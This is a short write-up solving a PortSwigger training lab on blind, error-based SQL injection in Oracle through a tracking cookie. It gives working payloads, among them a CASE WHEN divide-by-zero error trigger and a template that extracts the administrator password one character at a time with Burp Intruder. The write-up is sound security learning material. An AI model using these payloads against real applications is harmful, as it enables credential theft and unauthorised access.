# Lab 12 — Blind SQL injection with conditional errors

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

**Entry point:** `TrackingId` cookie · **DB:** Oracle

## Goal

Extract the `administrator` password using **error-based** conditional
responses (HTTP 500 as the "true" signal).

## Solution

1. Confirm the cookie is injectable (response stays 200):

```
xyz'||''||'
```

2. Trigger a controllable error with a CASE + divide-by-zero
   (`TO_CHAR(1/0)` raises `ORA-01476` → 500):

```
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

→ **500** = condition true; **200** = condition false.

3. Confirm the target data exists (should be 500):

```
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END
      FROM users WHERE username='administrator')||'
```

4. Extract character by character — payload template:

```
xyz'||(SELECT CASE WHEN (SUBSTR(password,§1§,1)='§a§')
      THEN TO_CHAR(1/0) ELSE '' END
      FROM users WHERE username='administrator')||'
```

5. Burp Intruder → **Cluster bomb** over position (1–20) and charset
   (`a-z0-9`); grep for status **500**. Each 500 marks a correct character.

6. Log in as `administrator` — lab solved.

## Notes

This is the go-to technique when a DBMS (like Oracle) has no boolean
output channel but propagates errors. `CASE WHEN` maps any predicate to a
forced, observable error.
